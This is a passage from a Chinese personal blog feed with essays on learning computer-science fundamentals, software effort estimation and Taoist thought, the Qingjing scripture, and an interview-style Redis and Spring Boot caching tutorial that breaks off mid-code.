        <content type="html"><![CDATA[<p>Vue 出 3 了，Spring 又更新了版本。网上一大票程序员叫学不动了，求不要再发布新版本了。</p><p>虽然工作多年，我时常也觉得学不动了。有时候再想软件行业永远也学不完吧。</p><p>一次偶然，我在 coursera 浏览了一个课程，它的前置课程是 discrete mathematics，也就是离散数学。我在想作者为什么要把离散数学放到一个应用的计算机课程中来呢？</p><p>我的专业是计算机网络，很遗憾没有学过离散数学，只学过微积分。于是我去看了下离散数学的介绍，有空去学一下。</p><p>看完介绍之后，后背发凉。</p><p>原来离散数学是很多计算机基础课程中的基础。数据库理论中的关系演算、哈弗曼树、笛卡尔积；计算机网络中的路由算法、通信原理；编程中用到的各种位运算技巧。这些知识都是离散数学的应用，难怪我在学习计算机网络和数据库理论的时候少了点什么支撑。</p><p>如果说计算机网络、数据库原理是知识的话，离散数学应该是知识中的知识。如果没有更加基本的知识中的知识，那么学到的这些计算机知识就像一盘散沙无法找到源头。</p><p>我才幡然醒悟，知识中的知识才是我们应该首先学习的东西，掌握了基础才能对应用知识顺手拈来。</p><p>因此我把计算机科学中的知识分为了两类：</p><ul><li>计算机的一些原理性的知识，例如数据库、分布式系统、操作系统、编译原理</li><li>还有一类是流行的软件、库、中间件的使用方法</li></ul><p>在程序员的生涯中学了太多的知识，与其说是知识不如说是在阅读某个开源软件的说明书。甚至是这些说明书的解释，更胜一步是翻译过来的中文材料。</p><p>于是就产生了程序员的知识获取鄙视链：</p><p>搞研究阅读论文的瞧不起读协议做实现的，读协议的看不起那些只能读某个实现软件的官方文档的，读英文文档的看不起读中文文档的，读中文文档的看不起看翻译版的，看翻译官方文档版本的看不起读周边书籍的。</p><p>处在鄙视链的最低端就是看视频教程手把手跟着学的。很不幸，我就是那个喜欢看视频教程处在鄙视链最低端的程序员。</p><p>更为具体的例子就是开源框架。基于 MVC 设计模式的各种框架不说上百种，也有几十种了。Java 中的 Spring MVC、Struts，PHP 中就更多了 Yii、CakePHP 等。Spring MVC 的文档是一个 MVC 框架的说明书，相关书籍时这个说明书的解释。</p><p>随着现代软件工程项目的复杂性越来越高，一个项目中引入的第三方软件包数十个，切换一个项目又需要重新学习另外的第三方软件。除此之外，还需要用到一些工具，IDE、Git、deveops 工具。如果涉猎架构和运维相关，还需要对基础设施很了解，docker、aws、ansible、keepalive 等。</p><p>这真的是 “生也有涯而知也无涯”，慢慢的我开始尝试取舍。</p><ul><li>git 只是一个代码管理工具，用 Intellij 中的快捷键又快又好的完成了工作。</li><li>MVC 框架架学透一个能用的就好。</li><li>前端的各种框架，快速读一下文档，了解一下直接在项目中使用。</li></ul><p>上面这些东西都只能叫做“开源软件说明书”，下面的叫做 “知识”。</p><ul><li>计算机导论，计算机运行的基本原理。二进制、字符串编码、位运算等</li><li>操作系统，计算机软件实现的基础。线程、进程、中断方式等</li><li>数据结构和算法，优化程序性能的基础。数组、链表、HASH和各种树</li><li>数据库原理，优化各种关系数据库的基础。索引原理、关系演算、范式理论等</li><li>计算机网络，互联网开发的基础。HTTP协议、DNS 的原理</li><li>密码学，计算机安全的基础。对称加密、非对称加密和各种签名算法</li><li>编译原理，理解编程语言的基础，造轮子的基础。语法分析、词法分析、闭包等</li></ul><p>阅读“开源软件说明书”的关键在于英语，现阶段大部分流行的开源框架和库都是英文文档，阅读英语是一个至关重要的能力。而学习计算机科学基础知识在于耐心，如果说学习 git 需要 4 个小时的课时的话。数据结构和算法起码需要 100 个小时，花费在计算机科学基础上的时间还需要包括实践，实验。</p><p>程序员持续学习的关键在于，层出不穷的框架、库和工具让人眼花缭乱，忘记了真正的知识是什么。也许当有一天，抵御了计算机行业中各种“时髦技术”的诱惑后，才能有所精进吧。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>数学对程序员有什么用</title>
      <link href="/math/math/index/"/>
      <url>/math/math/index/</url>
      
        <content type="html"><![CDATA[<p>离散数学在计算机科学中无处不在。</p>]]></content>
      
      
      <categories>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>清净经</title>
      <link href="/thinking/thinking/qingjinjing/"/>
      <url>/thinking/thinking/qingjinjing/</url>
      
        <content type="html"><![CDATA[<p>老君曰：大道无形，生育天地；大道无情，运行日月；大道无名，长养万物；吾不知其名，强名曰道。夫道者：有清有浊，有动有静；天清地浊，天动地静；男清女浊，男动女静；降本流末，而生万物。清者，浊之源，动者，静之基；人能常清静，天地悉皆归。</p><p>夫人神好清，而心扰之；人心好静，而欲牵之。常能遣其欲，而心自静；澄其心，而神自清；自然六欲不生，三毒消灭。所以不能者，为心未澄，欲未遣也；能遣之者：内观其心，心无其心；外观其形，形无其形；远观其物，物无其物；三者既悟，唯见於空。观空亦空，空无所空；所空既无，无无亦无；无无既无，湛然常寂。寂无所寂，欲岂能生；欲既不生，即是真静。真常应物，真常得性；常应常静，常清静矣。如此清静，渐入真道；既入真道，名为得道；虽名得道，实无所得；为化众生，名为得道；能悟之者，可传圣道。</p><p>老君曰：上士无争，下士好争；上德不德，下德执德；执著之者，不名道德。众生所以不得真道者，为有妄心；既有妄心，即惊其神；既惊其神，即著万物；既著万物，即生贪求；既生贪求，即是烦恼；烦恼妄想，忧苦身心；便遭浊辱，流浪生死；常沉苦海，永失真道。真常之道，悟者自得；得悟道者，常清静矣！</p><p>仙人葛翁曰：吾得真道，曾诵此经万遍。此经是天人所习，不传下士。吾昔受之於东华帝君，东华帝君受之於金阙帝君，金阙帝君受之於西王母，西王母皆口口相传，不记文字。吾今於世，书而录之。上士悟之，升为天官；中士修之，南宫列仙；下士得之，在世长年。游行三界，升入金门。<br>左玄真人曰：学道之士，持诵此经者，即得十天善神，拥护其身。然後玉符保神，金液炼形。形神俱妙，与道合真。</p><p>正一真人曰：人家有此经，悟解之者，灾障不干，众圣护门。神升上界，朝拜高真。功满德就，相感帝君。诵持不退，身腾紫云。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>提高工时估计准确性，减少开发成本</title>
      <link href="/team/team/better-estimation/"/>
      <url>/team/team/better-estimation/</url>
      
        <content type="html"><![CDATA[<h2 id="估时不准是很正常的事情"><a href="#估时不准是很正常的事情" class="headerlink" title="估时不准是很正常的事情"></a>估时不准是很正常的事情</h2><p>“如果一个程序员告诉你他已经完成了 90% 的工作量，那么他还需要同样的时间完成剩下的 10%”。</p><p>软件项目延期和跳票是众所周知的事情，其中不乏知名项目。</p><p>刚毕业的时候，我在一家做系统集成的公司工作，我们定制了一套售票软件，为景区接入互联网售票方案。供应该软件的软件公司非常自信的说，这东西非常简单，最多 2 个月就能搞出来。这家公司小有名气，我老板对 2 个月交付深信不疑，于是张罗了接入的客户、市场的物料等。</p><p>不过还是没能逃过 90% 定律，2 个月交付的东西只能算作一个 Demo。于是花了另外一个月测试，修复问题和完善业务逻辑，又花了另外几个月时间响应对接客户的条件，才逐渐稳定下来。</p><p>行百里者半九十，软件开发也大体如此。开发者估不准工时常有，估准了才奇怪呢。</p><p>后来自己也做了软件工程师，参与 it 项目开发，项目延期也是非常常见的事情。</p><h2 id="工时估算的前提是质量"><a href="#工时估算的前提是质量" class="headerlink" title="工时估算的前提是质量"></a>工时估算的前提是质量</h2><p>IT 团队能准时交付是一项非常有价值的能力，哪怕交付时间长一点。计划两周交付，最后能准时完成，比承诺 1 周时间，但是花了三周才交付重要得多。</p><p>越是大项目，越是重要。大项目的各个组件可能会发生相互依赖。如果不能准时交付，就会付出团队等待的情况，那可是真金白银。</p><p>做过项目管理的都知道甘特图，甘特图的每个泳道表达了项目各项资源的进展和计划。然而，软件项目不确定性非常多，各种突发事件。如果能提高准时按质量交付，各个单位的等待成本会小很多。</p><p>关键的是，衡量是否准时交付的关键是质量，其次才是交付。先给一个 demo，然后再慢慢改 bug。这种 “准时” 的交付，还不如有一个明确的延期时间，本质上还是 “猛糙快”。</p><p><strong>谈项目工时估算，前提是在满足质量要求的前提下，否则估时没有意义。</strong></p><h2 id="估算准确依赖工程能力"><a href="#估算准确依赖工程能力" class="headerlink" title="估算准确依赖工程能力"></a>估算准确依赖工程能力</h2><p>那么能不能提高软件工程工时的估算的准确性呢？其实是可以的，刚到 ThoughtWorks 的时候，参与了一个交付项目。在一个项目开始前就计划了项目结束的时间，以及下一个项目的计划和安排。结果让我非常吃惊，那个项目的结束时间，和预期只有 2 周左右。并且这两周是逐步减少开发人员，最后只有 1-2 个人负责最后一周的交接期。</p><p>这就是专业软件团队和小作坊的差别，在专业项目经理带领下能把 3 个月的项目估算，精确到 20 - 30 个人天。能把项目工时估算到这种程度，体现了 PM 的内功。</p><p>在一个敏捷团队，需要把工时估准，不在于 “估” ， 而在于团队执行项目的稳定性。<strong>一般来说，准确估算工时需要考虑需求分析程度、任务拆分的合理性、技术方案的可靠性、团队成员的能力、外部依赖和环境，如果这个项目不是新项目，还需要考虑遗留系统改造的成本和数据迁移的成本。</strong></p><h3 id="需求和任务分析"><a href="#需求和任务分析" class="headerlink" title="需求和任务分析"></a>需求和任务分析</h3><p>只有需求分析非常彻底才能保证估算的输入条件。非专业的业务分析师，只能看到需求冰山水面上的部分。软件的特性、功能的复杂性等。</p><p>专业的业务分析师，不仅需要看待功能需求，并对功能需求的逻辑性考虑完备。比如用户需要一个 APP，他实际上还需要一个后台，对应这个后台会有不同的用户、角色等。</p><p>根据这些业务输出，拆分出任务，敏捷开发中我们叫做用户故事，一个用户故事代表一个合理拆分的业务逻辑。能被评估工作量，然后根据这个工作量来评估工时。</p><p>除了这些功能需求之外，还有非功能需求。客户不仅仅需要一个 APP，还可能需要的是一个安全的、高性能的、国际化的 APP，而这些往往被客户当做默认选项。</p><p>一些性能优化的指标需要分析，并考虑性能优化的任务工时；安全需求可能有 HTTPS 配置，防病毒扫描等，都需要考虑；国际化也是额外的工作量。</p><p>挖掘用户真实需求的目的是定义怎么才算完成（Define of done），如果没人说得清楚满足什么条件这个项目才算完，那么估算工时根本无从谈起。</p><p><strong>彻底挖掘客户的真实需求是评估项目工时的首要条件。</strong></p><h3 id="技术方案和团队能力"><a href="#技术方案和团队能力" class="headerlink" title="技术方案和团队能力"></a>技术方案和团队能力</h3><p>技术方案和团队能力和项目时间估算很大关系。很多项目的时间估算都是技术经理或者 Teach lead 来完成，往往是他们按照自己的经验和能力进行计算。光是这样，很难算的准的。</p><p>团队有多少人？对这套技术方案的熟悉程度如何？方案是否会发生较大的调整。人越多，人员水平差距都为工时估计带来了不确定性。经验多的人来做方案，如果是他做过的相似方案，自然会估的稍准一点。但大多数情况下没有这么理想的场景。</p><p>要做好工时估算，需要结合技术方案和团队成员能力，而不是自己能干多少活儿，多快干完来算。</p><p>一方面，技术负责人需要安排相应的技术预研，走在实际编码的开发人员前面，探探路，验证方案的可行性、实施难度、风险。就像作战的侦查人员一样，我们把预研叫做 spike。 spike 需要输出一些结论、demo，支持项目的时间估算。</p><p>另外一方面，考察团队真实运作效率很好地方式是根据迭代做工时统计。按照两周为例，10 个人的团队是 100 个工时。如果按照之前的估算，2 周内需要完成的 100 个工时的任务，实际上只完成了 50 个工时。也就是进度只有 50%。</p><p>我这个算法比较粗糙，敏捷项目管理中还有更准确的速率计算方式。通过速率，就能对下一阶段的工时估算做出调整，并在工作量、人员上做出调整。</p><p><strong>通过方案预研和速率计算是提高项目工时估算准确率的良好方法。</strong></p><h3 id="遗留系统和外部依赖"><a href="#遗留系统和外部依赖" class="headerlink" title="遗留系统和外部依赖"></a>遗留系统和外部依赖</h3><p>我常常花了一下午时间完成了某个特性升级的编码，但是花了一个月的时间才完成了线上平滑升级、数据迁移。</p><p>真正有经验的工程师都知道，方案设计的难点往往不在设计一个新东西，而在于演进一个老系统。遗留系统演进是不可避免的，这种历史包袱是造成工时估算不准的一个重要因素。</p><p>遗留系统演进带来的估算困难来源下面几个方面：</p><ul><li>前置条件不满足或者很困难。客户可能觉得只是添加一个小功能，但是涉及数据库变更、API 升级。软件项目往往牵一发而动全身。</li><li>遗留系统代码难以理解，没有人说得清楚原委。这种系统往往伴随着重构，否则难以进行。</li><li>数据迁移的成本。例如，需求只是简单要求对用户的某些数据加密，实际工作包括了对存量数据的迁移。</li><li>临时代码的清理。遗留系统往往为三个状态，原始态-过渡态-最终态，很多人估算工时要么忘记了过渡态，就是忘记了最终态的时间成本。</li></ul><p>不负责的猜想，有一些客户就是遗留系统演进不下去了，然后招标做新功能，实际意图是想乙方顺便消化重构的成本。总之基于遗留系统的二次开发都是一件困难的事情，能不接就不接吧。</p><p>另外，社会分工意味着一个人干不完所有的事情，IT 项目往往一个项目也不是独立的。大多数情况下需要和外部条件进行集成，这部分时间超出我们的掌控。</p><p>集成这件事的成本需要试主动集成还是被动集成来说：</p><ol><li>需要等待别人提供服务，我们去集成。在估计工时的时候，一定要把对方的交付时间考虑进去，提前沟通，并建立契约。</li><li>提供给别人服务，被别人集成。这种情况估计工时，往往只是计算到 API 上线，实际上还需要考虑一定的支持、文档工作量。很少有一次到位的情况，大多要磨合一段时间。</li></ol><p><strong>集成充满了不确定性，估算工时时需要预留足够的集成空间，才能让工时估算更准确。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>项目工时估算是一个系统性工作，基本上很难有一个万能的方法。因此大多数情况下都是玄学，但是毕竟是 “估” ，也不能要求 100% 精确。</p><p>软件工程的估时更具有弹性，相对供应链管理的交付时间估算成本更低。做好估时，对减少项目运行成本和风险有巨大意义，工时估算的准确性也往往体现了一个 IT 团队工程能力。</p>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>道家的世界观</title>
      <link href="/thinking/thinking/dao-thinking/"/>
      <url>/thinking/thinking/dao-thinking/</url>
      
        <content type="html"><![CDATA[<h2 id="实事求是，道即规律"><a href="#实事求是，道即规律" class="headerlink" title="实事求是，道即规律"></a>实事求是，道即规律</h2><p>如果有人问我，祖师爷老君是神仙吗？</p><p>如果我说不是，请先别反对我。老君不仅是三清之一，拥有太上老君的名号。更重要的，老君还是周朝守藏史，一个博学、智慧的老者。</p><p>十几年初次接触到道德经，觉得祖师爷一定是一个全能的神仙，只有神仙才能写出这样的经书。被生活毒打的越厉害，从道德经中得到的越多。随着生活阅历的增加，道德经给我们的，远远比我们期望的多。</p><p>越经历生活的挫折，越发体会道德经的智慧。</p><p>“天下皆知美之为美，斯恶已；皆知善之为善，斯不善已。” 的辩证方法，让很多问题考虑的更为周到；“宠辱若惊，贵大患若身。”让人成熟稳重，不再患得患失；“故飘风不终朝，骤雨不终日。” 让人学会克制和细水长流。</p><p>老君一定是得到了宇宙的终极奥秘，没有什么事情他无法做到。正因如此，老君作为神，被世人膜拜。</p><p>求道者多如牛毛，谈玄者浩瀚如繁星。老君的学说被用在各个地方，有正道，有旁门左道。可以卖保健品、可以提高性能力、还可以解释量子力学，甚至可以预测彩票。</p><p>俗人迷，修道人也迷。</p><p>有幸听到张至顺道爷说，古时候的真人，首先是一个真实的人，其次才是神仙。十几年后，对道德经了解的越来越多，通过道德经和清静经的这句话，认识到老君的另一面。</p><blockquote><p>“大道无形，生育天地；大道无情，运行日月；大道无名，长养万物。吾不知其名，强名曰道。”</p></blockquote><p>理解了这句话，忽然拉近了老君之间的距离。也许几千年前的老君对着天空发呆，刹那间认识到了事物的规律。这些规律也许来自于丰富的阅历，或者来自整个国家的藏书，经过时间的发酵，最终清晰起来。</p><p>但老君也不知道如何形容它，不知道叫什么名字，无奈只能暂时起一个名字叫做道。这一刻老君也只是一个普通人，是一个敢于承认自己不知道的事实，是一个真实的人。</p><p>承认自己知识也有局限的老君，更值得人尊敬。道，是客观存在的规律，是实事求是的。对普通人来说，远离神神叨叨的言论，从小处学习，并加以实践，也许这是最能接近老君的路吧。</p><p>希望所有了解道家思想的人，都能学而不迷。老君曰：“不贵其师，不爱其资，虽智大迷，是谓要妙”，与君共勉。</p><h2 id="自律修行，知晓因果"><a href="#自律修行，知晓因果" class="headerlink" title="自律修行，知晓因果"></a>自律修行，知晓因果</h2><p>道家认识到了一个规律。</p><p>人世间的事物发展，人生的境况，大都受到三个方面的影响。</p><ul><li>先天的资质和时运，出身的条件。像富贵、美丑、聪慧等，几乎是不可变的，就像天难以被改变。</li><li>身边的环境。像处在市井、玄门、烟花柳巷等地方，人会受到这些环境的影响，但是可以付出努力改变。</li><li>自身的意志。自己的想法，个人的意志。</li></ul><p>学习数术的人，把这三个条件叫做：天、地、人，掌握了天地人的格局对事物的关系，就能预测事物的发展。</p><p>现实世界中，个人的意志实际上很弱，大多数人不足以改变环境。你以为有自己的意志，实际上是先天、环境在影响你。</p><p>感觉一个食物好吃，是因为饿了，并不是你自己觉得好吃；找到一个好工作，也许是行业的风口，并不是你能力多强；找到了一个好的对象，也许只是因为你家庭条件好，并不是你有多大魅力；你决定考研，也许并不是真的想要做研究，而是周围的舍友都在考研影响了你。</p><p>那些修行的人，把自己的真正意志，叫做元神，把先天、环境的影响叫做识神。</p><p>元神被识神淹没，人的想法、决定和事物的发展，都是由先天和环境决定了，人便动弹不得。家境优渥，顺风顺水，以为是自己的能力；行业蓬勃，得名得利，以为是自己的努力。等到家境破败、行业不景气时，又觉得自己运气不佳，常沉苦海。</p><p>我们极易犯得一个错误是把老天爷赏的饭吃，当做自己的本事。大多数情况下，我们都是靠天吃饭，个人意志起不了多大作用。由此，我们也困在这里面动弹不得，只能听天由命。</p><p>克服“天”已经很难了，贫寒的家境，无常的世事；克服 “地” 也不容易，身边的狐朋狗友，洗脑式的工作环境。我们做出的选择无时不刻被影响着，世俗的观念，被媒体绑架的价值观，我们几乎没有自己清醒的思想。</p><p>因此南华真人说，你以为有自由意志吗？钱财是上天给我们的，身体是上天给我们的，连意识和精神都是。这就是命由天定的由来。</p><p>命运不是被出生的生辰算定，而是被出身和环境算定。</p><p>道家的祖师们用行动告诉我们可以 “我命由我不由天”，前提是磨炼自己的意志，训练自己的心性，清醒的做出选择和行动。不受先天、环境的影响，才能改变自己，突破环境、先天的影响。</p><p>“酒色财气” 再加上名利、贪求、执着，任何一样都让本来的一点元神消失的一干二净。在这些东西下，做出的任何决策都是危险的。</p><p>外在的物质不能让我们内心安定， “五色令人目盲，五音令人耳聋，五味令人口爽，驰骋畋猎令人心发狂，难得之货令人行妨。” 。外在的评价也会动摇我们的意识，“宠辱若惊，贵大患若身。”。</p><p>当修行到自我的意识不因外物扰动的时候，元神就会出现，像一个旁观者，真正掌控自己的人生。</p><h2 id="通达自然，顺势而为"><a href="#通达自然，顺势而为" class="headerlink" title="通达自然，顺势而为"></a>通达自然，顺势而为</h2><p>内心不够安定的时候精通奇门、六壬的人也看不清局势，内心安定平和的人，一花一草都可以取象起卦，通晓因果。</p><p>而刚刚具备独立思考的人，元神只有一点，这个时候最为危险。以为自己有能力对抗环境、对抗先天的资质和时运。</p><p>我们刚刚学会游泳的时候总觉得用力蹬水，就不会沉下去，然而却越发不得要领。当我们选择不去对抗的时候，却发现想沉都沉不下去，因为人体的浮力总会让你浮起来。不去对抗之后，忘记技巧之后，才真正的算学会了游泳，这就是 “后天意识，返还先天自然” 的说法。</p><p>道德经就是一本教怎么在人生这个泳池游泳的书。那些我执的人，掉进了个人意志的陷阱，处处和人对抗、和事对抗，和生活对抗。</p><p>有些修行的人，我执起来比普通人还要严重。</p><p>煮过肉的锅不能用，算破戒，要坚持别人换锅重新煮；无视生态环境，不顾劝告也要放生，为求功德；自己对经文的解读，容不得其他人反驳。</p><p>事物的发展，都需要天时、地利、人和。我们唯一能力做的是做好自己，然后顺应自然。天上有阴晴云雨，地上有起伏坎坷。</p><p>南华真人说，古代的圣人，做好了事成事败的两方面打算就没有忧虑。鱼离开水面与其相若以沫，不如忘记曾经在水里的生活。当天时、环境发生变化的时候，而我们能做的就是，顺应变化的规律，积极应对，不怠慢，也不对抗。</p>]]></content>
      
      
      <categories>
          
          <category> thinking </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Maven 父子项目配置</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/maven-parent-project/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/maven-parent-project/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【佳作分析】 详解 Redis</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/we-redis-summary/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/we-redis-summary/</url>
      
        <content type="html"><![CDATA[<p><strong>Redis 是什么</strong></p><p><strong>面试官：</strong>你先来说下 Redis 是什么吧！</p><p><strong>我：</strong>（这不就是总结下 Redis 的定义和特点嘛）Redis 是 C 语言开发的一个开源的（遵从 BSD 协议）高性能键值对（key-value）的内存数据库，可以用作数据库、缓存、消息中间件等。</p><p>它是一种 NoSQL（not-only sql，泛指非关系型数据库）的数据库。</p><p>我顿了一下，接着说，Redis 作为一个内存数据库：</p><ul><li>性能优秀，数据在内存中，读写速度非常快，支持并发 10W QPS。</li><li>单进程单线程，是线程安全的，采用 IO 多路复用机制。</li><li>丰富的数据类型，支持字符串（strings）、散列（hashes）、列表（lists）、集合（sets）、有序集合（sorted sets）等。</li><li>支持数据持久化。<br>可以将内存中数据保存在磁盘中，重启时加载。</li><li>主从复制，哨兵，高可用。</li><li>可以用作分布式锁。</li><li>可以作为消息中间件使用，支持发布订阅。</li></ul><p><strong>五种数据类型</strong></p><p><strong>面试官：</strong>总结的不错，看来是早有准备啊。刚来听你提到 Redis 支持五种数据类型，那你能简单说下这五种数据类型吗？</p><p><strong>我：</strong>当然可以，但是在说之前，我觉得有必要先来了解下 Redis 内部内存管理是如何描述这 5 种数据类型的。</p><p>说着，我拿着笔给面试官画了一张图：</p><p><img src="/写作技巧/writing/we-redis-summary/v2-f50cc08a309349c853c7ad515b1393ec_1440w-20200621104221806.jpg" alt="img"></p><p><strong>我：</strong>首先 Redis 内部使用一个 redisObject 对象来表示所有的 key 和 value。</p><p>redisObject 最主要的信息如上图所示：type 表示一个 value 对象具体是何种数据类型，encoding 是不同数据类型在 Redis 内部的存储方式。</p><p>比如：type=string 表示 value 存储的是一个普通字符串，那么 encoding 可以是 raw 或者 int。</p><p>我顿了一下，接着说，下面我简单说下 5 种数据类型：</p><p>①String 是 Redis 最基本的类型，可以理解成与 Memcached一模一样的类型，一个 Key 对应一个 Value。Value 不仅是 String，也可以是数字。</p><p>String 类型是二进制安全的，意思是 Redis 的 String 类型可以包含任何数据，比如 jpg 图片或者序列化的对象。String 类型的值最大能存储 512M。</p><p>②Hash是一个键值（key-value）的集合。Redis 的 Hash 是一个 String 的 Key 和 Value 的映射表，Hash 特别适合存储对象。常用命令：hget，hset，hgetall 等。</p><p>③List 列表是简单的字符串列表，按照插入顺序排序。可以添加一个元素到列表的头部（左边）或者尾部（右边） 常用命令：lpush、rpush、lpop、rpop、lrange（获取列表片段）等。</p><p>应用场景：List 应用场景非常多，也是 Redis 最重要的数据结构之一，比如 Twitter 的关注列表，粉丝列表都可以用 List 结构来实现。</p><p>数据结构：List 就是链表，可以用来当消息队列用。Redis 提供了 List 的 Push 和 Pop 操作，还提供了操作某一段的 API，可以直接查询或者删除某一段的元素。</p><p>实现方式：Redis List 的是实现是一个双向链表，既可以支持反向查找和遍历，更方便操作，不过带来了额外的内存开销。</p><p>④Set 是 String 类型的无序集合。集合是通过 hashtable 实现的。Set 中的元素是没有顺序的，而且是没有重复的。常用命令：sdd、spop、smembers、sunion 等。</p><p>应用场景：Redis Set 对外提供的功能和 List 一样是一个列表，特殊之处在于 Set 是自动去重的，而且 Set 提供了判断某个成员是否在一个 Set 集合中。</p><p>⑤Zset 和 Set 一样是 String 类型元素的集合，且不允许重复的元素。常用命令：zadd、zrange、zrem、zcard 等。</p><p>使用场景：Sorted Set 可以通过用户额外提供一个优先级（score）的参数来为成员排序，并且是插入有序的，即自动排序。</p><p>当你需要一个有序的并且不重复的集合列表，那么可以选择 Sorted Set 结构。</p><p>和 Set 相比，Sorted Set关联了一个 Double 类型权重的参数 Score，使得集合中的元素能够按照 Score 进行有序排列，Redis 正是通过分数来为集合中的成员进行从小到大的排序。</p><p>实现方式：Redis Sorted Set 的内部使用 HashMap 和跳跃表（skipList）来保证数据的存储和有序，HashMap 里放的是成员到 Score 的映射。</p><p>而跳跃表里存放的是所有的成员，排序依据是 HashMap 里存的 Score，使用跳跃表的结构可以获得比较高的查找效率，并且在实现上比较简单。</p><p><strong>数据类型应用场景总结：</strong></p><p><img src="/写作技巧/writing/we-redis-summary/v2-a4667eebbc97ad5c0223760a092bf6e4_1440w-20200621104222047.jpg" alt="img"></p><p><strong>面试官：</strong>想不到你平时也下了不少工夫，那 Redis 缓存你一定用过的吧？</p><p><strong>我：</strong>用过的。</p><p><strong>面试官：</strong>那你跟我说下你是怎么用的？</p><p>我是结合 Spring Boot 使用的。一般有两种方式，一种是直接通过 RedisTemplate 来使用，另一种是使用 Spring Cache 集成 Redis（也就是注解的方式）。</p><p><strong>Redis 缓存</strong></p><p>直接通过 RedisTemplate 来使用，使用 Spring Cache 集成 Redis pom.xml 中加入以下依赖：</p><pre><code class="text">&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;        &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.session&lt;/groupId&gt;        &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;        &lt;artifactId&gt;lombok&lt;/artifactId&gt;        &lt;optional&gt;true&lt;/optional&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><p><strong>spring-boot-starter-data-redis：</strong>在 Spring Boot 2.x 以后底层不再使用 Jedis，而是换成了 Lettuce。</p><p><strong>commons-pool2：</strong>用作 Redis 连接池，如不引入启动会报错。</p><p><strong>spring-session-data-redis：</strong>Spring Session 引入，用作共享 Session。</p><p>配置文件 application.yml 的配置：</p><pre><code class="text">server:  port: 8082  servlet:    session:      timeout: 30msspring:  cache:    type: redis  redis:    host: 127.0.0.1    port: 6379    password:    # redis默认情况下有16个分片，这里配置具体使用的分片，默认为0    database: 0    lettuce:      pool:        # 连接池最大连接数(使用负数表示没有限制),默认8        max-active: 100</code></pre><p>创建实体类 User.java：</p><pre><code class="text">public class User implements Serializable{    private static final long serialVersionUID = 662692455422902539L;    private Integer id;    private String name;    private Integer age;    public User() {    }    public User(Integer id, String name, Integer age) {        this.id = id;        this.name = name;        this.age = age;    }    public Integer getId() {        return id;    }    public void setId(Integer id) {        this.id = id;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    public Integer getAge() {        return age;    }    public void setAge(Integer age) {        this.age = age;    }    @Override    public String toString() {        return &quot;User{&quot; +                &quot;id=&quot; + id +                &quot;, name=&#39;&quot; + name + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;}&#39;;    }}</code></pre><p><strong>RedisTemplate 的使用方式</strong></p><p>默认情况下的模板只能支持 RedisTemplate&lt;String, String&gt;，也就是只能存入字符串，所以自定义模板很有必要。</p><p>添加配置类 RedisCacheConfig.java：</p><pre><code class="text">@Configuration@AutoConfigureAfter(RedisAutoConfiguration.class)public class RedisCacheConfig {    @Bean    public RedisTemplate&lt;String, Serializable&gt; redisCacheTemplate(LettuceConnectionFactory connectionFactory) {        RedisTemplate&lt;String, Serializable&gt; template = new RedisTemplate&lt;&gt;();        template.setKeySerializer(new StringRedisSerializer());        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());        template.setConnectionFactory(connectionFactory);        return template;    }}</code></pre><p>测试类：</p><pre><code class="text">@RestController@RequestMapping(&quot;/user&quot;)public class UserController {    public static Logger logger = LogManager.getLogger(UserController.class);    @Autowired    private StringRedisTemplate stringRedisTemplate;    @Autowired    private RedisTemplate&lt;String, Serializable&gt; redisCacheTemplate;    @RequestMapping(&quot;/test&quot;)    public void test() {        redisCacheTemplate.opsForValue().set(&quot;userkey&quot;, new User(1, &quot;张三&quot;, 25));        User user = (User) redisCacheTemplate.opsForValue().get(&quot;userkey&quot;);        logger.info(&quot;当前获取对象：{}&quot;, user.toString());    }</code></pre><p>然后在浏览器访问，观察后台日志 <a href="http://localhost:8082/user/test" target="_blank" rel="noopener">http://localhost:8082/user/test</a></p><p><img src="/写作技巧/writing/we-redis-summary/v2-459aa19b6acff143007e38c45341c46d_1440w-20200621104221776.png" alt="img"></p><p><strong>使用 Spring Cache 集成 Redis</strong></p><p>Spring Cache 具备很好的灵活性，不仅能够使用 SPEL（spring expression language）来定义缓存的 Key 和各种 Condition，还提供了开箱即用的缓存临时存储方案，也支持和主流的专业缓存如 EhCache、Redis、Guava 的集成。</p><p>定义接口 UserService.java：</p><pre><code class="text">public interface UserService {    User save(User user);    void delete(int id);    User get(Integer 